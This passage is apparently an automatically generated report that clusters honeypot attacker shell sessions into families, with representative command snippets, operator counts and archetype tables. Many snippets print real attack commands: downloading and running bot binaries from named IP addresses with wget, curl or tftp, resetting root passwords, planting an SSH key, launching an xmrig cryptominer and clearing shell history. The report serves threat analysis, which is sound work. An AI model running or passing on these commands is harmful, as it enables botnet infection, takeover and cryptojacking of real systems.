'&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';'), ('busybox', '&&'), ('busybox', ';')]`

Top operators: [('busybox', 1737), ('>', 304), ('cd', 238), ('enable', 17), ('system', 17), ('shell', 17), ('sh', 17), ('PH_EXEC_1', 16), ('PH_EXEC_2', 16)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5d277131fa5526f0 | 1cf08f2350d4 |       88 |              10 |
| 1a900ff44766ea7a | 26177b6ab7c9 |       93 |              10 |
| 0005d1d3118dd48f | 59b23f4ceb27 |       89 |               6 |
| b6e7ad04fa484fb1 | 4359afd9ce6c |      100 |               6 |
| cf09aa1fdc8e7588 | 35c7f3b8b87a |       94 |               5 |
| fe665a9f2408d5aa | 5cc16e08bb3b |       97 |               4 |
| 0735fb9e5037597f | 2b21eb33a92e |       89 |               3 |
| 34c324385dd557af | 2897a4d4a4f5 |       85 |               3 |
| cb62d827f39ab664 | 377c668c5161 |       86 |               2 |
| dbda13307c762f16 | 409566658424 |       96 |               2 |

---

## Family 106

- **Total Session Volume**: 52
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.882 (±0.000)
- **Medoid Archetype**: `2ae05492fbf0abd3` (Session: `041ec45e78d1`, n_rows=11)

**Medoid Execution Snippet:**
```text
start
enable
config terminal
system
linuxshell
shell
sh
echo -e '\x66\x6E\x69\x61\x79'
passwd
cd /tmp || cd /var || cd /dev || cd /etc
cat /bin/ls | more ;
```

**Consensus Skeleton (op, conn pairs):**
`[('start', ';'), ('enable', ';'), ('config', ';'), ('system', ';'), ('linuxshell', ';'), ('shell', ';'), ('sh', ';'), ('echo', ';'), ('passwd', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('cat', '|')]`

Top operators: [('cd', 8), ('cat', 3), ('start', 2), ('enable', 2), ('config', 2), ('system', 2), ('linuxshell', 2), ('shell', 2), ('sh', 2), ('echo', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2ae05492fbf0abd3 | 041ec45e78d1 |       11 |              29 |
| b5ad1ef38eeffb21 | 03dbe01d6d6e |       12 |              23 |

---

## Family 34

- **Total Session Volume**: 45
- **FI-Unique Archetypes**: 5
- **Mean FS**: 0.859 (±0.072)
- **Medoid Archetype**: `39b35facc5943937` (Session: `07b6e43d8faf`, n_rows=7)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:xgvRso9jRzoC" | chpasswd | bash
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|')]`

Top operators: [('grep', 15), ('cat', 10), ('awk', 10), ('wc', 5), ('echo', 5), ('chpasswd', 5), ('bash', 5), ('head', 5), ('free', 5), ('ls', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9b9193aad90f44ae | 43e75f4049ca |        4 |              13 |
| 1acd19d5ab59d3e9 | 00f0fd2b4c0f |        8 |              11 |
| 0f90cf70358cb74b | 1316843ca12d |        6 |               8 |
| e4652063a2748384 | 52d6391201ea |        9 |               7 |
| 39b35facc5943937 | 07b6e43d8faf |        7 |               6 |

---

## Family 81

- **Total Session Volume**: 36
- **FI-Unique Archetypes**: 6
- **Mean FS**: 0.920 (±0.035)
- **Medoid Archetype**: `1f6b5b0e661fd207` (Session: `00aea3c7227b`, n_rows=13)

**Medoid Execution Snippet:**
```text
cat /etc/issue
cd /tmp || cd /run || cd /
wget http://136.144.41.227/CocknBallsbins.sh
chmod 777 CocknBallsbins.sh
sh CocknBallsbins.sh
tftp 136.144.41.227 -c get CocknBallstftp1.sh
chmod 777 CocknBallstftp1.sh
sh CocknBallstftp1.sh
tftp -r CocknBallstftp2.sh -g 136.144.41.227
chmod 777 CocknBallstf ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';')]`

Top operators: [('sh', 19), ('cd', 18), ('chmod', 18), ('tftp', 12), ('rm', 12), ('wget', 6), ('cat', 2), ('history', 2), ('shell', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 160f60200a5f9040 | 1879142da404 |       12 |              28 |
| 1f6b5b0e661fd207 | 00aea3c7227b |       13 |               4 |
| 54fc5d029ade4fb6 | 54c9fe9cf098 |       14 |               1 |
| 8b6567fd78c15068 | affe691a5dcb |       13 |               1 |
| a18ea352af6e4ce4 | 4a0318a7cd93 |       12 |               1 |
| b3974f65f514c153 | cba6a722bc19 |       13 |               1 |

---

## Family 51

- **Total Session Volume**: 34
- **FI-Unique Archetypes**: 12
- **Mean FS**: 0.874 (±0.097)
- **Medoid Archetype**: `48f8f7e4524bb938` (Session: `f6d53719e559`, n_rows=3)

**Medoid Execution Snippet:**
```text
wget http://5.182.210.145/snype.x86
chmod 777 snype.x86
./snype.x86 ;
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';')]`

Top operators: [('wget', 12), ('chmod', 11), ('PH_EXEC_1', 7), ('sh', 4), ('gcc', 1), ('Unsp0ken.x86', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 79c8a42fcec84e2f | 03a4fac9d45a |        3 |              20 |
| 48f8f7e4524bb938 | f6d53719e559 |        3 |               2 |
| 94a596fe6da61056 | 15da79161d1d |        2 |               2 |
| fd6efeeed0ad8d45 | 267475fcad96 |        3 |               2 |
| 44fd52dc84d91993 | 9942bab57591 |        3 |               1 |
| 531cf2d366cb404e | e1b31b38f310 |        2 |               1 |
| 65e6e1cfb35fd26b | db21400499ec |        3 |               1 |
| 7109dc54fba3bc2b | 30937d1f0a6b |        3 |               1 |
| 793aea4887db2a6a | 5133f6887779 |        3 |               1 |
| 831e27be8abe32ef | 552307055078 |        3 |               1 |

---

## Family 204

- **Total Session Volume**: 33
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `5f0d16f01547c026` (Session: `06bf996697e5`, n_rows=2)

**Medoid Execution Snippet:**
```text
echo -n 12j1bqyz | md5sum
uname -a ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('md5sum', ';'), ('uname', 'EOS')]`

Top operators: [('echo', 1), ('md5sum', 1), ('uname', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5f0d16f01547c026 | 06bf996697e5 |        2 |              33 |

---

## Family 73

- **Total Session Volume**: 32
- **FI-Unique Archetypes**: 12
- **Mean FS**: 0.904 (±0.069)
- **Medoid Archetype**: `2b5150c23e9a475b` (Session: `169fdf1896b0`, n_rows=8)

**Medoid Execution Snippet:**
```text
cat /etc/issue
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget -q http://46.19.141.122/bins/x86
cat x86 > snort
chmod 777 snort
chmod +x snort
./snort rooted.x86
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';')]`

Top operators: [('cd', 60), ('cat', 23), ('chmod', 19), ('wget', 12), ('PH_EXEC_1', 11), ('history', 10), ('sh', 2), ('>', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 7879301414703b7b | 05db3c270717 |        7 |              14 |
| 69765b4232307f30 | 30538228778d |        7 |               5 |
| 48eb2ca1ea3f4238 | 1705b7fd6ed6 |        8 |               3 |
| 5132f82d03311d29 | 6afedda8c350 |        9 |               2 |
| 2b5150c23e9a475b | 169fdf1896b0 |        8 |               1 |
| 621ae3ac5ea7d041 | 34d82197f3ff |        8 |               1 |
| 67111c7e7ba97650 | 174afa5a12fa |        6 |               1 |
| 69389df6348c3521 | c6be4acb1344 |        8 |               1 |
| 79bed62d9fd307a5 | c2d115c455a8 |        8 |               1 |
| 7d8788661b1bb424 | ad7416ccf874 |        7 |               1 |

---

## Family 57

- **Total Session Volume**: 31
- **FI-Unique Archetypes**: 11
- **Mean FS**: 0.888 (±0.054)
- **Medoid Archetype**: `f41b161bd5c6de6f` (Session: `1b2abbd36aa1`, n_rows=55)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRBiyqk8SLD3ijQpfZwQ9vsHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdNzBcU05QhhWW6tSuYcXcyAz8Cp73JmN6TcPu ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';'), ('cp', '&&'), ('>', '&&'), ('cd', ';'), ('rm', ';'), ('cp', ';'), ('cp', ';'), ('chmod', ';'), ('chmod', ';')]`

Top operators: [('cp', 273), ('chmod', 193), ('cd', 113), ('rm', 102), ('>', 97), ('echo', 32), ('wget', 27), ('curl', 16), ('mkdir', 11), ('PH_EXEC_1', 6)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| f41b161bd5c6de6f | 1b2abbd36aa1 |       55 |               8 |
| fd72cb4f45f849e1 | 0f84e84af4c5 |       55 |               8 |
| 0fbbb73a992a1549 | 1e4ef284af42 |       54 |               5 |
| aec995df140efe75 | 8ee5f7aa5c56 |       60 |               3 |
| 2947edaad3d01fd2 | 41a2d12b1a77 |       57 |               1 |
| 4de7c6f505e96866 | eca903d82bca |       68 |               1 |
| 5aae2bd4f720f0b6 | e70ed293d905 |       52 |               1 |
| 88ee541f05362261 | e68234724d01 |       51 |               1 |
| 942310c72989fe46 | b73ef9525f53 |       52 |               1 |
| ad067a0543af7890 | 13fa1dbf5b48 |       71 |               1 |

---

## Family 41

- **Total Session Volume**: 30
- **FI-Unique Archetypes**: 10
- **Mean FS**: 0.881 (±0.090)
- **Medoid Archetype**: `4e638d8ebbdeacac` (Session: `ed1371c09e55`, n_rows=5)

**Medoid Execution Snippet:**
```text
cd /tmp
rm -rf xmr*
pkill xmrig*
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xvf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && screen ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 31pTFN66yAMH2MGnus7fhsTcA4uGJJ2D7J.$RAN ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('rm', ';'), ('wget', '&&'), ('tar', '&&'), ('cd', '&&')]`

Top operators: [('cd', 20), ('rm', 10), ('wget', 10), ('tar', 10), ('screen', 9), ('PH_EXEC_2', 9), ('kill', 5), ('sudo', 2), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 24d23a4bdb9bbc17 | 0dd5c641a2ab |        4 |              10 |
| 9b2b93610f1c0dba | 0c2661537639 |        5 |               8 |
| e173cb5379850085 | 2209ef3937b7 |        4 |               4 |
| 9d2442a1de40e1aa | 58a27ef74622 |        5 |               2 |
| 336232ba6547be3a | 791fa22ddc17 |        4 |               1 |
| 4e638d8ebbdeacac | ed1371c09e55 |        5 |               1 |
| 7da9676e41aec22f | 6274c3f6c77d |        4 |               1 |
| 85f30e496815458a | 36302732c728 |        5 |               1 |
| be2cf647c057577f | 35e1520abd2d |        5 |               1 |
| d38e852d65a0dfd3 | bd5aa85cc6a3 |        5 |               1 |

---

## Family 13

- **Total Session Volume**: 25
- **FI-Unique Archetypes**: 12
- **Mean FS**: 0.838 (±0.073)
- **Medoid Archetype**: `6a89d79f334f2349` (Session: `dbc057f85708`, n_rows=5)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://5.154.181.68/skid.x86
chmod +x skid.x86
./skid.x86 skid.x86
rm -rf * ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';')]`

Top operators: [('cd', 59), ('wget', 13), ('chmod', 11), ('PH_EXEC_1', 8), ('rm', 6), ('curl', 5), ('sh', 4), ('cat', 1), ('kill', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| c11e3d0826ebb5a1 | 490258141bbd |        6 |              10 |
| 313ff979d76b4376 | 1d61f37404e9 |        6 |               3 |
| fd842b79aea2c08d | 324e80891106 |        6 |               3 |
| 6a89d79f334f2349 | dbc057f85708 |        5 |               1 |
| 6a9b86ded747bc1c | da914a481744 |        4 |               1 |
| 9345b1e72370b30a | 83f03d8caa56 |        5 |               1 |
| a761c29f070945a3 | 2d9821e76787 |        4 |               1 |
| ad0c053d6e8f0ed6 | 1c6e74f34e13 |        5 |               1 |
| bea83e007b343ce1 | c36927085150 |        4 |               1 |
| c1fbd47699ff2078 | 3cf9640b052f |        4 |               1 |

---

## Family 2

- **Total Session Volume**: 24
- **FI-Unique Archetypes**: 7
- **Mean FS**: 0.831 (±0.096)
- **Medoid Archetype**: `10f3f661b8df8ecc` (Session: `3026b1b00768`, n_rows=10)

**Medoid Execution Snippet:**
```text
sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://203.159.80.150/Sakura.sh
chmod 777 *
sh Sakura.sh
tftp -g 203.159.80.150 -r tftp1.sh
chmod 777 *
sh tftp1.sh
rm -rf *.sh
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('chmod', ';'), ('sh', ';')]`

Top operators: [('cd', 36), ('sh', 18), ('chmod', 15), ('wget', 7), ('tftp', 7), ('rm', 7), ('history', 6), ('shell', 2), ('ls', 2), ('cat', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 82865ab70d22907f | 08b9224e49aa |        9 |              13 |
| 10f3f661b8df8ecc | 3026b1b00768 |       10 |               4 |
| b42c226b050b9f02 | 3815d6496768 |       10 |               3 |
| 8af5a46b230f6cfd | 3ad028ea2c0e |       15 |               1 |
| b770f8097554358e | 7fe8908c5b63 |       12 |               1 |
| d7ffa2e3e7ed1ed8 | 820e8706b06f |        9 |               1 |
| ec38b4c2cb4ae497 | 5d1a121d42c0 |        9 |               1 |

---

## Family 21

- **Total Session Volume**: 22
- **FI-Unique Archetypes**: 2
- **Mean FS**: 0.786 (±0.000)
- **Medoid Archetype**: `2a565fa12527e1f7` (Session: `283b4b0dccbc`, n_rows=3)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo -e "superuser\nSfnIDDBrZhNm\nSfnIDDBrZhNm" | passwd | bash
Enter new UNIX password: ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|')]`

Top operators: [('cat', 2), ('grep', 2), ('wc', 2), ('echo', 2), ('bash', 2), ('passwd', 1), ('Enter', 1), ('chpasswd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2a565fa12527e1f7 | 283b4b0dccbc |        3 |              12 |
| e0420131f1e486ed | 1c5657ce8d3f |        2 |              10 |

---

## Family 336

- **Total Session Volume**: 19
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `bce20a6b3195eb1c` (Session: `137456487bbc`, n_rows=1)

**Medoid Execution Snippet:**
```text
echo -n 1Zswks7M | md5sum ;
```

**Consensus Skeleton (op, conn pairs):**
`[('echo', '|'), ('md5sum', 'EOS')]`

Top operators: [('echo', 1), ('md5sum', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| bce20a6b3195eb1c | 137456487bbc |        1 |              19 |

---

## Family 23

- **Total Session Volume**: 18
- **FI-Unique Archetypes**: 13
- **Mean FS**: 0.872 (±0.068)
- **Medoid Archetype**: `7d09e64e6f5d4c7c` (Session: `4ef0fd833d1c`, n_rows=8)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://109.104.151.109/ModpEAD/xJSq.x86_64
curl -O http://109.104.151.109/ModpEAD/xJSq.x86_64
cat xjSq.x86_64 >kzpold ;chmod +x *;./kzpold Selfrep.x86_64
tftp 109.104.151.109 -c get xjSq.x86_64
chmod 777 xjSq.x86_64
./xjSq.x86_64 Exploit.x86 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_1', ';')]`

Top operators: [('cd', 65), ('chmod', 23), ('PH_EXEC_1', 14), ('wget', 13), ('curl', 13), ('cat', 12), ('rm', 12), ('tftp', 10), ('>', 9), ('PH_EXEC_2', 9)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 6aec717e0bbe7a23 | 436f71aa089b |       10 |               4 |
| 02661ba640ad5dbe | bd205eeff0b9 |        9 |               3 |
| 418554e422c7e35e | db45ff46a5f6 |        7 |               1 |
| 5813c8c2281957fb | 8a0ad0ccd125 |        9 |               1 |
| 7d09e64e6f5d4c7c | 4ef0fd833d1c |        8 |               1 |
| 898ca045db77cdb3 | 461376b4b582 |        8 |               1 |
| 9312e21f50ad677e | 277cc6bb195b |        9 |               1 |
| 9825f36a7cf83e83 | 3d528d84edde |        7 |               1 |
| 9ffc6f00e23f3711 | 7c968b8511f9 |        9 |               1 |
| b618b391cf28929b | 2f6645a63c6d |        8 |               1 |

---

## Family 154

- **Total Session Volume**: 18
- **FI-Unique Archetypes**: 5
- **Mean FS**: 0.857 (±0.049)
- **Medoid Archetype**: `2618862eaf588710` (Session: `57a7983fd7ff`, n_rows=13)

**Medoid Execution Snippet:**
```text
#!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://182.53.197.62/centaur-docs/23s
curl -O http://182.53.197.62/centaur-docs/23s
chmod +x 23s
./23s
wget http://182.53.197.62/centaur-docs/23
curl -O http://182.53.197.62/centaur-docs/23
chmod +x 23
./23
rm -rf ...
```

**Consensus Skeleton (op, conn pairs):**
`[('wget', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_2', ';')]`

Top operators: [('wget', 10), ('curl', 10), ('chmod', 10), ('PH_EXEC_1', 5), ('PH_EXEC_2', 5), ('rm', 4), ('PH_EXEC_3', 3), ('ls', 3), ('history', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 2618862eaf588710 | 57a7983fd7ff |       13 |               8 |
| 04713c8af9b9a58e | 08cd6f7407bb |       11 |               7 |
| 08c6f8a7116b5c3d | fd2e07aeb82a |       12 |               1 |
| 0b64b14ac328c365 | f18307ba4898 |       14 |               1 |
| 94cae6b86af6688d | d9ef9e06b2d5 |       12 |               1 |

---

## Family 96

- **Total Session Volume**: 18
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.989 (±0.008)
- **Medoid Archetype**: `a94b10e419c5761d` (Session: `1521782ac28e`, n_rows=31)

**Medoid Execution Snippet:**
```text
>/tmp/.l && cd /tmp/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || ./helloworld
>/var/.l && cd /var/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || ./helloworld
>/dev/.l && cd /dev/
echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || ./helloworld
>/mnt/.l && cd /mnt/
echo -en '\x50\x41\x54\x ...
```

**Consensus Skeleton (op, conn pairs):**
`[('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('>', '&&'), ('cd', ';'), ('echo', '||'), ('PH_EXEC_1', ';'), ('wget', ';')]`

Top operators: [('>', 42), ('cd', 42), ('echo', 42), ('PH_EXEC_1', 42), ('wget', 3), ('chmod', 2), ('PH_EXEC_2', 2), ('curl', 1), ('ftpget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a94b10e419c5761d | 1521782ac28e |       31 |               9 |
| dd235351229192ad | 012933d30768 |       31 |               8 |
| 1b91dd9f52578d30 | 129ee17966f9 |       31 |               1 |

---

## Family 4

- **Total Session Volume**: 17
- **FI-Unique Archetypes**: 8
- **Mean FS**: 0.833 (±0.083)
- **Medoid Archetype**: `0c34db04a905b224` (Session: `1714fc3bf885`, n_rows=5)

**Medoid Execution Snippet:**
```text
cat /etc/issue
wget http://185.246.221.138/x-8.6-.GHOUL
chmod +x x-8.6-.GHOUL
./x-8.6-.GHOUL
rm -rf x-8.6-.GHOUL ;
```

**Consensus Skeleton (op, conn pairs):**
`[('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', 'EOS')]`

Top operators: [('rm', 10), ('wget', 8), ('chmod', 8), ('PH_EXEC_1', 8), ('cat', 4), ('sh', 1), ('curl', 1), ('cwget', 1), ('lscpu', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 0c34db04a905b224 | 1714fc3bf885 |        5 |               9 |
| b364ad445fea37a4 | 2826240b49f4 |        5 |               2 |
| 0169c0e1ed6adcaa | d317b5fc98c5 |        6 |               1 |
| 021cda85adade07c | 09d89077ee47 |        4 |               1 |
| 3a772dcbc75ff74d | 7c6941e58cc3 |        6 |               1 |
| 6207591f25525fa4 | dab8b55acbb1 |        5 |               1 |
| 83805ebd320a0d05 | 336357c65930 |        5 |               1 |
| 83deff325e3af409 | e0af4afc0cde |        5 |               1 |

---

## Family 17

- **Total Session Volume**: 16
- **FI-Unique Archetypes**: 8
- **Mean FS**: 0.855 (±0.072)
- **Medoid Archetype**: `fc06305959bd3d78` (Session: `1bcc506e3c4c`, n_rows=14)

**Medoid Execution Snippet:**
```text
cd /tmp  cd /var/run  cd /mnt  cd /root  cd /
wget http://5.181.135.114/bins.sh
chmod 777 bins.sh
sh bins.sh
tftp 5.181.135.114 -c get tftp1.sh
chmod 777 tftp1.sh
sh tftp1.sh
tftp -r tftp2.sh -g 5.181.135.114
chmod 777 tftp2.sh
sh tftp2.sh
ftpget -v -u anonymous -p anonymous -P 21 5.181.135.114 ftp1 ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';')]`

Top operators: [('sh', 31), ('chmod', 24), ('tftp', 16), ('rm', 14), ('cd', 8), ('wget', 8), ('ftpget', 6), ('curl', 3), ('exit', 1), ('history', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 97a0b32c644e5183 | 065ecbbe6c36 |       15 |               6 |
| ce81a8f368bbec00 | 2db267d549fb |       15 |               4 |
| 0cd22c72e1ec3bca | 3766b6efa37a |       16 |               1 |
| 2fb7ca00cc17439a | cd68ae03743c |       12 |               1 |
| 7561a04677b9f6f4 | 3c798b88ba50 |       12 |               1 |
| bd01d37e7cda5db4 | e57391d1dfae |       15 |               1 |
| d865362d301f2502 | 657ea5831ae7 |       12 |               1 |
| fc06305959bd3d78 | 1bcc506e3c4c |       14 |               1 |

---

## Family 14

- **Total Session Volume**: 16
- **FI-Unique Archetypes**: 3
- **Mean FS**: 0.781 (±0.012)
- **Medoid Archetype**: `d7d62a8c05e9246f` (Session: `b0a205ec1479`, n_rows=6)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | wc -l
echo "root:iyEBxfPKKe8E" | chpasswd | bash
echo "321" > /var/tmp/.var03522123
rm -rf /var/tmp/.var03522123
cat /var/tmp/.var03522123 | head -n 1
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', 'EOS')]`

Top operators: [('cat', 8), ('echo', 7), ('grep', 6), ('head', 5), ('passwd', 4), ('wc', 3), ('bash', 3), ('awk', 3), ('Enter', 2), ('rm', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 5ae416bfc8a33b4a | 02a3f5122716 |        5 |              14 |
| a609ce42e97310fa | c88cf73b77eb |        8 |               1 |
| d7d62a8c05e9246f | b0a205ec1479 |        6 |               1 |

---

## Family 246

- **Total Session Volume**: 16
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `cc753cd1f1e98901` (Session: `018989405a03`, n_rows=25)

**Medoid Execution Snippet:**
```text
start
enable
config terminal
system
linuxshell
su
shell
sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
rm -rf i
wget http://192.168.1.1:8088/i
curl -O http://192.168.1.1:8088/i
/bin/busybox wget http://192.168.1.1:8088/i
/bin/busybox tftp 192.168.1.1 6969 -c get i
chmod 777 i
./i
tftp 192. ...
```

**Consensus Skeleton (op, conn pairs):**
